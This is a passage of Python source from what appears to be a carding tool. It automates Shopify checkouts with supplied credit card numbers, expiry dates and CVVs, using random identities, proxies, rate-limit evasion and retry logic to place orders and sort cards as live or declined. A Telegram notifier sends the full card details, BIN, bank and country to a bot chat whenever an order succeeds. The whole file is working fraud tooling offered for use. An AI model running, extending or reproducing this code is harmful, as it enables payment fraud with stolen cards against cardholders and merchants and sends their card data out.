                info = {"brand": scheme, "type": _or_dash(str(d.get("type", "")).upper()),
                        "level": _or_dash(d.get("brand")),
                        "bank": _or_dash((d.get("bank") or {}).get("name")),
                        "country": _or_dash((d.get("country") or {}).get("name")),
                        "flag": _or_dash((d.get("country") or {}).get("emoji"))}
                _BIN_CACHE[b] = info
                return info
        except Exception:
            pass
    except Exception:
        pass
    return BIN_FALLBACK


# ── telegram ────────────────────────────────────────────────────────────────
async def tg_notify(cc, mes, ano, cvv, gateway, price, currency, site):
    if not TG_BOT_TOKEN or not TG_CHAT_IDS:
        return
    try:
        import urllib.request
        bin6 = cc[:6]
        info = await asyncio.get_event_loop().run_in_executor(None, bin_lookup, bin6)
        text = (f"🔥 <b>ORDER PLACED</b>\n\n"
                f"CC: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                f"BIN: <code>{bin6}</code>\n"
                f"Brand: {info['brand']} {info['flag']}\n"
                f"Type: {info['type']} - {info['level']}\n"
                f"Bank: {info['bank']}\n"
                f"Country: {info['country']}\n\n"
                f"Gate: {gateway}\nPrice: {price} {currency}\nSite: {site}")
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        for cid in TG_CHAT_IDS:
            body = json.dumps({"chat_id": cid, "text": text, "parse_mode": "HTML",
                               "disable_notification": True}).encode()
            req = urllib.request.Request(url, data=body,
                                         headers={"Content-Type": "application/json"})
            try:
                urllib.request.urlopen(req, timeout=8).read()
            except Exception:
                pass
    except Exception:
        pass


# ── cart / checkout ─────────────────────────────────────────────────────────
def _extract_sst(text, resp_headers):
    return (resp_headers.get("x-checkout-one-session-token")
            or extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
            or extract_between(text, 'name="serialized-sessionToken" content="', '"')
            or extract_between(text, '"serializedSessionToken":"', '"')
            or extract_between(text, 'data-session-token="', '"')
            or extract_between(text, '"sessionToken":"', '"')
            or extract_between(text, '"token":"', '"'))


async def _cart_add(sess, url, vid, doc_headers):
    """form -> JSON -> 422 pe no-proxy/fresh variant. (ok, status, err)"""
    await asyncio.sleep(random.randint(100, 900) / 1000.0)
    cart_url = url + "/cart/add.js"
    base_h = {**doc_headers,
              "Accept": "application/json, text/javascript, */*; q=0.01",
              "Content-Type": "application/x-www-form-urlencoded",
              "Origin": url, "Referer": url + "/",
              "X-Requested-With": "XMLHttpRequest",
              "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin"}
    try:
        r = await sess.post(cart_url, data=f"id={vid}&quantity=1", headers=base_h,
                            allow_redirects=True, timeout=CART_TIMEOUT)
        if r.status_code == 200:
            return True, 200, None
        st = r.status_code
        if st in (429, 503):
            await asyncio.sleep(1.2 + random.random() * 1.8)
            r = await sess.post(cart_url, data=f"id={vid}&quantity=1", headers=base_h,
                                allow_redirects=True, timeout=CART_TIMEOUT)
            if r.status_code == 200:
                return True, 200, None
            return False, r.status_code, f"rate limited (HTTP {r.status_code})"
        # JSON fallback
        try:
            jh = dict(base_h)
            jh["Content-Type"] = "application/json"
            r2 = await sess.post(cart_url, json={"items": [{"id": int(vid), "quantity": 1}]},
                                 headers=jh, allow_redirects=True, timeout=CART_TIMEOUT)
            return r2.status_code == 200, r2.status_code, None
        except Exception as e:
            return False, st, e
    except Exception as e:
        return False, 0, e


async def _open_checkout(sess, url, vid, doc_headers, proxy_str, prof, purl):
    ok, st, err = await _cart_add(sess, url, vid, doc_headers)
    if not ok and st == 422:
        await asyncio.sleep(random.randint(400, 1000) / 1000.0)
        # (a) proxy IP flagged -> bina proxy try karo
        np_sess = None
        try:
            np_sess, _ = await _new_session(None, prof)
            ok2, st2, _e2 = await _cart_add(np_sess, url, vid, doc_headers)
            if ok2:
                ok, st = True, st2
            else:
                # (b) variant dead -> fresh variant
                fresh, _fe = await fetch_products(url, None, sess=np_sess, prof=prof)
                if fresh and fresh["variant_id"] != vid:
                    ok3, st3, _e3 = await _cart_add(np_sess, url, fresh["variant_id"], doc_headers)
                    if ok3:
                        vid = fresh["variant_id"]
                        ok, st = True, st3
        except Exception:
            pass
        finally:
            if np_sess:
                try:
                    await np_sess.close()
                except Exception:
                    pass

    if not ok:
        return None, "", None, st, vid

    try:
        r = await sess.post(url + "/checkout/", headers={**doc_headers,
                                                         "Content-Type": "application/x-www-form-urlencoded",
                                                         "Origin": url, "Referer": url + "/cart"},
                            allow_redirects=True, timeout=REQ_TIMEOUT)
        text = r.text
        final = str(r.url)
        sst = _extract_sst(text, r.headers)
        return final, text, sst, r.status_code, vid
    except Exception as e:
        return None, f"checkout error: {e}", None, 0, vid


# ── core flow ───────────────────────────────────────────────────────────────
async def _process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str,
                        overrides, prof, prod_override=None, tried_digital=False):
    gateway = "Shopify Payments"
    total_price = "0.00"
    currency = "USD"
    ourl = _norm(site_url)
    site_key = urlparse(ourl).netloc

    purl = parse_proxy(proxy_str) if proxy_str else None
    pstat = "Not Used" if not proxy_str else ("Dead" if not purl else "Live")

    sess, _imp = await _new_session(purl, prof)
    try:
        fn, ln = rand_name()
        email = rand_email(fn, ln)
        if overrides:
            fn = overrides.get("first") or fn
            ln = overrides.get("last") or ln
            email = overrides.get("email") or email

        addr = pick_addr(overrides.get("countryCode") if overrides else None)
        if overrides:
            for k in ("address1", "city", "postalCode", "zoneCode", "phone"):
                if overrides.get(k):
                    addr[k] = overrides[k]
        cc_code = addr["countryCode"]

        requires_shipping = True
        if prod_override is not None:
            variant_id = prod_override["variant_id"]
            requires_shipping = prod_override.get("requires_shipping", True)
        elif not variant_id:
            info = await fetch_products(ourl, purl, sess=sess, prof=prof)
            if isinstance(info, tuple):
                if proxy_str and "Proxy" in str(info[1]):
                    pstat = "Dead"
                return False, info[1], gateway, total_price, currency, pstat
            variant_id = info["variant_id"]
            requires_shipping = info.get("requires_shipping", True)

        doc_headers = _doc_headers(ourl, prof)
        checkout_url, text, sst, status, variant_id = await _open_checkout(
            sess, ourl, variant_id, doc_headers, proxy_str, prof, purl)

        if status in (429, 430, 503):
            return False, "RATE_LIMITED", gateway, total_price, currency, pstat
        if not checkout_url:
            return False, "CHECKOUT_SESSION_FAILED", gateway, total_price, currency, pstat

        low = text.lower()
        if "login" in checkout_url.lower():
            return False, "Site requires login!", gateway, total_price, currency, pstat
        if "we couldn't complete" in low or "we could not complete" in low:
            return False, "Checkout: We couldn't complete", gateway, total_price, currency, pstat

        atm = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
        attempt = atm.group(1) if atm else checkout_url.split("/")[-1].split("?")[0]

        raw = unescape(text)
        queue_token = (extract_between(text, "queueToken&quot;:&quot;", "&quot;")
                       or extract_between(raw, '"queueToken":"', '"') or "")
        stable_id = extract_stable_id(text) or str(uuid.uuid4())

        if not sst:
            if "password" in low and ("enter" in low or "store" in low):
                return False, "Site is password protected", gateway, total_price, currency, pstat
            return False, "CHECKOUT_SESSION_FAILED", gateway, total_price, currency, pstat

        if "currencyCode&quot;:&quot;" in text:
            currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
        elif '"currencyCode":"' in raw:
            currency = extract_between(raw, '"currencyCode":"', '"') or "USD"

        merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
                 or extract_between(raw, "ProductVariantMerchandise/", '"') or str(variant_id))

        build_id = ""
        bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', raw)
        if bm:
            build_id = bm.group(1)

        source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
        if source_token:
            source_token = source_token.replace("&quot;", "").strip('"')

        pci_url = "https://checkout.pci.shopifyinc.com/sessions"
        pm = re.search(r'checkoutCardsinkUrl":"([^"]+)"', raw)
        if pm:
            pci_url = pm.group(1)
            if not pci_url.endswith("/sessions"):
                pci_url = pci_url.rstrip("/") + "/sessions"
        pci_host = urlparse(pci_url).netloc or "checkout.pci.shopifyinc.com"

        ident = extract_between(raw, 'checkoutCardsinkCallerIdentificationSignature":"', '"')
        vault_domain = ""
        vm = re.search(r'"hostedFields[Uu]rl"\s*:\s*"[^"]+"\s*,\s*"domain"\s*:\s*"([^"]+)"', raw)
        if vm:
            vault_domain = vm.group(1)
        pci_scope = vault_domain or site_key

        headers = {"User-Agent": prof["ua"],
                   "Accept": "application/json, text/plain, */*",
                   "Accept-Language": random.choice(ACCEPT_LANGS),
                   "Content-Type": "application/json",
                   "Origin": ourl, "Referer": ourl + "/",
                   "shopify-checkout-client": "checkout-web/1.0",
                   "shopify-checkout-source": f'id="{attempt}", type="cn"',
                   "x-checkout-one-session-token": sst,
                   "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                   "sec-fetch-site": "same-origin"}
        headers.update(_ch_headers(prof))
        if build_id:
            headers["x-checkout-web-build-id"] = build_id
            headers["x-checkout-web-deploy-stage"] = "production"
            headers["x-checkout-web-server-handling"] = "fast"
            headers["x-checkout-web-server-rendering"] = "yes"
        if source_token:
            headers["x-checkout-web-source-id"] = source_token

        gql_host = urlparse(checkout_url).netloc or site_key
        gql_url = f"https://{gql_host}/checkouts/unstable/graphql"

        billing = {"streetAddress": {
            "address1": addr["address1"], "address2": "", "city": addr["city"],
            "countryCode": cc_code, "postalCode": addr["postalCode"],
            "firstName": fn, "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"]}}

        variables = {
            "sessionInput": {"sessionToken": sst},
            "queueToken": queue_token,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"partialStreetAddress": dict(billing["streetAddress"])},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}},
                        "options": {}},
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True}],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True},
            "merchandise": {"merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
                "lineComponentsSource": None,
                "lineComponents": []}]},
            "payment": {"totalAmount": {"any": True}, "paymentLines": [],
                        "billingAddress": billing},
            "buyerIdentity": {
                "customer": {"presentmentCurrency": currency, "countryCode": cc_code},
                "email": email, "emailChanged": False,
                "phoneCountryCode": cc_code,
                "marketingConsent": [{"email": {"value": email}}],
                "shopPayOptInPhone": {"countryCode": cc_code},
                "rememberMe": False},
            "tip": {"tipLines": []},
            "taxes": _tax_input(None, currency),
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {"signature": None, "signatureUuid": None,
                                  "lineItemScriptChanges": [], "paymentScriptChanges": [],
                                  "shippingScriptChanges": []},
            "optionalDuties": {"buyerRefusesDuties": False},
        }

        q_prop = _q_for(site_key, QUERY_PROPOSAL, QUERY_PROPOSAL_SLIM)

        # ── proposal #1 ─────────────────────────────────────────────────────
        seller = None
        checkpoint = None
        for i in range(2):
            await _host_pace(gql_host)
            r = await sess.post(gql_url, params={"operationName": "Proposal"}, headers=headers,
                                json={"query": q_prop, "variables": variables,
                                      "operationName": "Proposal"},
                                allow_redirects=True, timeout=GQL_TIMEOUT)
            rt = r.text
            if _schema_drift(rt):
                return False, "SCHEMA_DRIFT", gateway, total_price, currency, pstat
            if is_captcha_text(rt):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
            if r.status_code in (429, 430, 503):
                return False, "RATE_LIMITED", gateway, total_price, currency, pstat
            try:
                rj = json.loads(rt)
            except json.JSONDecodeError:
                if i == 0 and rt.strip().startswith("<"):
                    await asyncio.sleep(0.8)
                    continue
                return False, _nonjson_code(r.status_code, rt), gateway, total_price, currency, pstat
            if rj.get("errors") and not rj.get("data"):
                msgs = "; ".join(e.get("message", "") for e in rj["errors"][:3])
                if "syntax error" in msgs.lower():
                    return False, "GRAPHQL_SYNTAX", gateway, total_price, currency, pstat
                return False, f"GraphQL Error: {msgs}", gateway, total_price, currency, pstat
            try:
                res = rj["data"]["session"]["negotiate"]["result"]
                rtype = res.get("__typename", "")
                if rtype == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, total_price, currency, pstat
                if rtype == "Throttled":
                    return False, "Throttled", gateway, total_price, currency, pstat
                if rtype == "NegotiationResultFailed":
                    return False, "Negotiation failed", gateway, total_price, currency, pstat
                checkpoint = res.get("checkpointData")
                queue_token = res.get("queueToken") or queue_token
                seller = res["sellerProposal"]
            except (KeyError, TypeError) as e:
                return False, f"Proposal parse error: {e}", gateway, total_price, currency, pstat
            break

        if seller is None:
            return False, "Negotiation failed", gateway, total_price, currency, pstat

        totals = {"running_total": "0", "total_price": "0.00", "currency": currency,
                  "tax_amount": None}
        _read_money(seller, totals)
        total_price = totals["total_price"]
        currency = totals["currency"]
        tax_amount = totals["tax_amount"]

        ship = {"handle": "", "shipping_amount": 0.0, "signed_handle": None,
                "requires_shipping": requires_shipping}
        _read_delivery(seller, ship)
        _capture_artifacts(seller, variables)

        payment_id = None
        fallback_pid, fallback_gw = None, None
        pdata = seller.get("payment") or {}
        if pdata.get("__typename") == "FilledPaymentTerms":
            for m in pdata.get("availablePaymentLines") or []:
                pmth = m.get("paymentMethod") or {}
                pid = pmth.get("paymentMethodIdentifier")
                if not pid:
                    continue
                nm = (pmth.get("extensibilityDisplayName") or pmth.get("name") or "")
                if any(k in nm.lower() for k in ("paypal", "google", "shop pay", "shoppay",
                                                 "klarna", "afterpay", "clearpay", "sezzle",
                                                 "affirm", "amazon", "apple pay", "installments")):
                    if fallback_pid is None:
                        fallback_pid, fallback_gw = pid, (nm or "Shopify Payments")
                    continue
                payment_id = pid
                gateway = nm or "Shopify Payments"
                break
        if not payment_id and fallback_pid:
            payment_id, gateway = fallback_pid, fallback_gw
        if not payment_id:
            return False, "No valid payment method found", gateway, total_price, currency, pstat

        if ship["requires_shipping"]:
            dl = variables["delivery"]["deliveryLines"][0]
            dl["selectedDeliveryStrategy"] = _strategy_input(True, ship["handle"])
            dl["targetMerchandiseLines"] = {"lines": [{"stableId": stable_id}]}
            dl["destinationChanged"] = False
        else:
            variables["delivery"] = {"deliveryLines": [],
                                     "noDeliveryRequired": [{"stableId": stable_id}],
                                     "useProgressiveRates": False,
                                     "prefetchShippingRatesStrategy": None,
                                     "supportsSplitShipping": True}

        variables["payment"]["billingAddress"] = billing
        variables["buyerIdentity"]["shopPayOptInPhone"]["number"] = addr["phone"]

        # ── proposal #2 (delivery) ──────────────────────────────────────────
        await _host_pace(gql_host)
        r = await sess.post(gql_url, params={"operationName": "Proposal"}, headers=headers,
                            json={"query": q_prop, "variables": variables,
                                  "operationName": "Proposal"},
                            allow_redirects=True, timeout=GQL_TIMEOUT)
        rt = r.text
        if is_captcha_text(rt):
            return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
        if r.status_code in (429, 430, 503):
            return False, "RATE_LIMITED", gateway, total_price, currency, pstat
        try:
            dj = json.loads(rt)
        except json.JSONDecodeError:
            return False, _nonjson_code(r.status_code, rt), gateway, total_price, currency, pstat

        dres = (dj.get("data") or {}).get("session", {}).get("negotiate", {}).get("result", {})
        dseller = dres.get("sellerProposal") or seller
        if dres.get("queueToken"):
            queue_token = dres["queueToken"]
        if dres.get("checkpointData"):
            checkpoint = dres["checkpointData"]
        _read_money(dseller, totals)
        _read_delivery(dseller, ship)
        _capture_artifacts(dseller, variables)
        total_price = totals["total_price"]
        currency = totals["currency"]
        tax_amount = totals["tax_amount"]
        requires_shipping = ship["requires_shipping"]
        if requires_shipping and not ship["handle"]:
            requires_shipping = False

        # ── vault ───────────────────────────────────────────────────────────
        async def vault_once(use_proxy):
            vs, _ = await _new_session(purl if use_proxy else None, prof)
            try:
                ph = {"accept": "*/*", "accept-language": random.choice(ACCEPT_LANGS),
                      "referer": ourl, "user-agent": prof["ua"],
                      "sec-fetch-dest": "script", "sec-fetch-mode": "no-cors",
                      "sec-fetch-site": "cross-site"}
                ph.update(_ch_headers(prof))
                try:
                    await vs.get(f"https://{pci_host}/dist/card_fields.js", headers=ph, timeout=12)
                except Exception:
                    pass

                vh = {"Content-Type": "application/json", "Accept": "application/json",
                      "Accept-Language": random.choice(ACCEPT_LANGS),
                      "Origin": f"https://{pci_host}",
                      "Referer": (f"https://{pci_host}/build/{build_id or 'a8e4a94'}"
                                  f"/number-ltr.html?identifier=&locationURL="),
                      "User-Agent": prof["ua"],
                      "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                      "sec-fetch-site": "same-origin",
                      "sec-fetch-storage-access": "active"}
                vh.update(_ch_headers(prof))
                if ident:
                    vh["shopify-identification-signature"] = ident
                    vh["x-checkout-cardsink-caller-identification-signature"] = ident

                payload = {"credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{fn} {ln}"},
                    "payment_session_scope": pci_scope}

                async with _pci_sem:
                    rr = await vs.post(pci_url, json=payload, headers=vh,
                                       allow_redirects=True, timeout=VAULT_TIMEOUT)
                if rr.status_code in (403, 429, 430, 503):
                    return None, f"HTTP {rr.status_code}"
                body = rr.text
                if body.strip().startswith("{"):
                    try:
                        j = json.loads(body)
                    except json.JSONDecodeError:
                        j = {}
                    for k in ("id", "token", "payment_session_id", "session_id"):
                        if j.get(k):
                            return str(j[k]), None
                    if isinstance(j.get("data"), dict) and j["data"].get("id"):
                        return str(j["data"]["id"]), None
                m = re.search(r'"(?:id|token|payment_session_id|session_id)"\s*:\s*"([^"]+)"', body)
                if m:
                    return m.group(1), None
                return None, f"No token (HTTP {rr.status_code})"
            finally:
                try:
                    await vs.close()
                except Exception:
                    pass

        token = None
        verr = None
        for a in range(3):
            token, verr = await vault_once(True)
            if token:
                break
            await asyncio.sleep(0.5 + a * 0.45)

        if not token and purl:
            _bump("vault_fallback")
            _cool_site_proxy(site_key, proxy_str)
            for a in range(3):
                token, verr = await vault_once(False)
                if token:
                    break
                await asyncio.sleep(0.6 + a * 0.5)

        if not token:
            if purl:
                pstat = "Dead"
                _mark_proxy_fail(proxy_str)
            return False, f"PCI_TOKEN_FAILED: {verr or 'no token'}", gateway, total_price, currency, pstat

        # ── submit helpers ──────────────────────────────────────────────────
        def build_sub_vars(tok):
            if requires_shipping:
                dv = {"deliveryLines": [{
                    "destination": {"streetAddress": dict(billing["streetAddress"])},
                    "selectedDeliveryStrategy": _strategy_input(True, ship["handle"], addr["phone"]),
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": False}],
                    "noDeliveryRequired": [], "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True}
            else:
                dv = {"deliveryLines": [], "noDeliveryRequired": [{"stableId": stable_id}],
                      "useProgressiveRates": False, "prefetchShippingRatesStrategy": None,
                      "supportsSplitShipping": True}
            inp = {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queue_token,
                "checkpointData": checkpoint,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": dv,
                "deliveryExpectations": {"deliveryExpectationLines":
                                         ([{"signedHandle": ship["signed_handle"]}]
                                          if (requires_shipping and ship.get("signed_handle")) else [])},
                "merchandise": {"merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None, "lineComponents": []}]},
                "payment": {"totalAmount": {"any": True}, "paymentLines": [{
                    "paymentMethod": {"directPaymentMethod": {
                        "paymentMethodIdentifier": payment_id, "sessionId": tok,
                        "billingAddress": billing, "cardSource": None}},
                    "amount": {"any": True}, "dueAt": None}],
                    "billingAddress": billing},
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": cc_code},
                    "email": email, "emailChanged": False, "phoneCountryCode": cc_code,
                    "marketingConsent": [{"email": {"value": email}}],
                    "shopPayOptInPhone": {"number": addr["phone"], "countryCode": cc_code},
                    "rememberMe": False},
                "taxes": _tax_input(tax_amount, currency, any_amount=(tax_amount is None)),
                "tip": {"tipLines": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": variables.get("nonNegotiableTerms"),
                "optionalDuties": {"buyerRefusesDuties": False},
                "scriptFingerprint": variables.get("scriptFingerprint") or {
                    "signature": None, "signatureUuid": None, "lineItemScriptChanges": [],
                    "paymentScriptChanges": [], "shippingScriptChanges": []},
            }
            if variables.get("transformerFingerprintV2"):
                inp["transformerFingerprintV2"] = variables["transformerFingerprintV2"]
            if variables.get("captcha"):
                inp["captcha"] = variables["captcha"]
            return {"input": inp, "attemptToken": f"{attempt}-{rand_str()}", "metafields": [],
                    "analytics": {"requestUrl": checkout_url}}

        q_sub = _q_for(site_key, MUTATION_SUBMIT, MUTATION_SUBMIT_SLIM)
        q_poll = _q_for(site_key, QUERY_POLL, QUERY_POLL_SLIM)

        async def submit(vars_obj):
            try:
                await _host_pace(gql_host)
                r = await sess.post(gql_url, params={"operationName": "SubmitForCompletion"},
                                    headers=headers,
                                    json={"query": q_sub, "variables": vars_obj,
                                          "operationName": "SubmitForCompletion"},
                                    allow_redirects=True, timeout=GQL_TIMEOUT)
            except Exception as e:
                return {"__typename__": "__ERR__", "raw": str(e)[:120]}, ""
            t = r.text
            if is_captcha_text(t):
                return {"__typename__": "__CAPTCHA__"}, t
            try:
                j = json.loads(t)
            except json.JSONDecodeError:
                return {"__typename__": "__NONJSON__", "raw": t}, t
            node = (j.get("data") or {}).get("submitForCompletion")
            if not node:
                return {"__typename__": "__EMPTY__", "raw": t}, t
            return node, t

        async def poll(rid):
            body = {"query": q_poll,
                    "variables": {"receiptId": rid, "sessionToken": sst},
                    "operationName": "PollForReceipt"}
            for _ in range(6):
                await _host_pace(gql_host)
                r = await sess.post(gql_url, params={"operationName": "PollForReceipt"},
                                    headers=headers, json=body, allow_redirects=True,
                                    timeout=GQL_TIMEOUT)
                t = r.text
                if is_captcha_text(t):
                    return False, "CARD_DECLINED", gateway, total_price, currency, pstat
                try:
                    j = json.loads(t)
                except json.JSONDecodeError:
                    await asyncio.sleep(1.0)
                    continue
                rd = (j.get("data") or {}).get("receipt") or {}
                tn = rd.get("__typename", "")
                if tn == "ProcessedReceipt":
                    return True, "ORDER_PLACED", gateway, total_price, currency, pstat
                if tn == "FailedReceipt":
                    err = rd.get("processingError") or {}
                    if err.get("__typename") == "PaymentFailed":
                        code = err.get("code") or ""
                        msg = err.get("messageUntranslated") or ""
                        if code in ("", "GENERIC_ERROR", "PAYMENT_FAILED") and msg:
                            return False, msg, gateway, total_price, currency, pstat
                        return False, code or "CARD_DECLINED", gateway, total_price, currency, pstat
                    return False, err.get("__typename") or "CARD_DECLINED", gateway, total_price, currency, pstat
                if tn == "ActionRequiredReceipt":
                    return False, "3DS_REQUIRED", gateway, total_price, currency, pstat
                if tn in ("ProcessingReceipt", "WaitingReceipt"):
                    await asyncio.sleep(min((rd.get("pollDelay") or 400) / 1000.0, POLL_MAX_SLEEP))
                    continue
                return False, f"UNHANDLED_{tn}", gateway, total_price, currency, pstat
            return False, "STILL_PROCESSING", gateway, total_price, currency, pstat

        async def eval_retry(node):
            tn = node.get("__typename__", "")
            if tn in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                rc = node.get("receipt") or {}
                rtn = rc.get("__typename", "")
                if rtn == "ProcessedReceipt":
                    return True, "ORDER_PLACED", gateway, total_price, currency, pstat
                if rtn == "ActionRequiredReceipt":
                    return False, "3DS_REQUIRED", gateway, total_price, currency, pstat
                if rtn == "FailedReceipt":
                    err = rc.get("processingError") or {}
                    if err.get("__typename") == "PaymentFailed":
                        code = err.get("code") or ""
                        msg = err.get("messageUntranslated") or ""
                        if code in ("", "GENERIC_ERROR", "PAYMENT_FAILED") and msg:
                            return False, msg, gateway, total_price, currency, pstat
                        return False, code or "CARD_DECLINED", gateway, total_price, currency, pstat
                    return False, err.get("__typename") or "CARD_DECLINED", gateway, total_price, currency, pstat
                rid = rc.get("id")
                if rid:
                    return await poll(rid)
                return False, "CARD_DECLINED", gateway, total_price, currency, pstat
            if tn == "SubmitFailed":
                return False, clean_resp(node.get("reason")), gateway, total_price, currency, pstat
            if tn == "SubmitRejected":
                errs = node.get("errors") or []
                if errs:
                    e = errs[0]
                    return False, clean_resp(e.get("code") or e.get("localizedMessage")), \
                        gateway, total_price, currency, pstat
            if tn == "__CAPTCHA__":
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
            if tn == "__ERR__":
                return False, f"Connection error: {node.get('raw')}", gateway, total_price, currency, pstat
            return False, clean_resp(node.get("raw") or "CARD_DECLINED"), gateway, total_price, currency, pstat

        sub_vars = build_sub_vars(f"{attempt}-{rand_str()}")
        node, stext = await submit(sub_vars)
        rt_type = node.get("__typename__", "")

        if rt_type in ("__CAPTCHA__", "__NONJSON__", "__EMPTY__", "__ERR__"):
            return await eval_retry(node)

        if rt_type == "Throttled":
            await asyncio.sleep(min((node.get("pollAfter") or 600) / 1000.0, 2.0))
            sub_vars = build_sub_vars(f"{attempt}-{rand_str()}")
            node, stext = await submit(sub_vars)
            rt_type = node.get("__typename__", "")
            if rt_type == "Throttled":
                return False, "Throttled", gateway, total_price, currency, pstat

        if rt_type == "CheckpointDenied":
            return False, "Checkpoint Denied", gateway, total_price, currency, pstat

        if rt_type == "SubmitFailed":
            reason = node.get("reason") or ""
            rl = reason.lower()
            if (("delivery" in rl and ("changed" in rl or "may have" in rl))
                    or "delivery_line_detail" in rl):
                node2, _ = await submit(_deep(sub_vars))
                return await eval_retry(node2)
            return False, clean_resp(reason), gateway, total_price, currency, pstat

        if rt_type == "SubmitRejected":
            errs = node.get("errors") or []
            blob = " ".join(
                f"{e.get('code','')} {e.get('localizedMessage','')} "
                f"{e.get('nonLocalizedMessage','')}" for e in errs).lower()

            # 1) delivery line changed
            if ("delivery_delivery_line_detail" in blob
                    or "delivery details may have changed" in blob
                    or "verify your shipping" in blob or "shipping method" in blob):
                if not requires_shipping:
                    nv = _deep(sub_vars)
                    inp = nv["input"]
                    inp["delivery"] = {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}},
                                "options": {}},
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["NONE"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True}],
                        "noDeliveryRequired": [], "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True}
                    node2, _ = await submit(nv)
                    r2 = await eval_retry(node2)
                    if r2[0] or not _is_retryable(r2[1]):
                        return r2
                else:
                    # physical: fresh shipping proposal -> fresh handle -> re-submit
                    prop2 = _deep(variables)
                    prop2["delivery"]["deliveryLines"][0]["destination"] = {
                        "partialStreetAddress": dict(billing["streetAddress"])}
                    prop2["delivery"]["deliveryLines"][0]["destinationChanged"] = True
                    await _host_pace(gql_host)
                    rr = await sess.post(gql_url, params={"operationName": "Proposal"},
                                         headers=headers,
                                         json={"query": q_prop, "variables": prop2,
                                               "operationName": "Proposal"},
                                         allow_redirects=True, timeout=GQL_TIMEOUT)
                    try:
                        rj2 = json.loads(rr.text)
                        sp2 = (rj2.get("data") or {}).get("session", {}).get(
                            "negotiate", {}).get("result", {}).get("sellerProposal")
                    except Exception:
                        sp2 = None
                    if sp2:
                        new_ship = {"handle": "", "shipping_amount": 0.0,
                                    "signed_handle": None, "requires_shipping": True}
                        _read_delivery(sp2, new_ship)
                        nv = _deep(sub_vars)
                        try:
                            nv["input"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = \
                                _strategy_input(True, new_ship["handle"], addr["phone"])
                        except (KeyError, IndexError, TypeError):
                            pass
                        node2, _ = await submit(nv)
                        r2 = await eval_retry(node2)
                        if r2[0] or not _is_retryable(r2[1]):
                            return r2
                return False, "DELIVERY_OPTIONS_CHANGED", gateway, total_price, currency, pstat

            # 2) price mismatch
            if ("merchandise_expected_price_mismatch" in blob
                    or "order_total_changed" in blob or "order total has changed" in blob):
                node2, _ = await submit(_deep(sub_vars))
                r2 = await eval_retry(node2)
                if r2[0] or not _is_retryable(r2[1]):
                    return r2
                return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency, pstat

            # 3) address rejected -> fallback country
            if ("delivery_address" in blob or "no delivery strategy" in blob
                    or "not deliver to this address" in blob or "invalid address" in blob
                    or "ship to this address" in blob):
                fb_cc = DELIVERY_FALLBACK.get(cc_code, "US")
                fb = pick_addr(fb_cc)
                sa = {"address1": fb["address1"], "address2": "", "city": fb["city"],
                      "countryCode": fb["countryCode"], "postalCode": fb["postalCode"],
                      "firstName": fn, "lastName": ln, "zoneCode": fb["zoneCode"],
                      "phone": fb["phone"]}
                nv = _deep(sub_vars)
                inp = nv["input"]
                try:
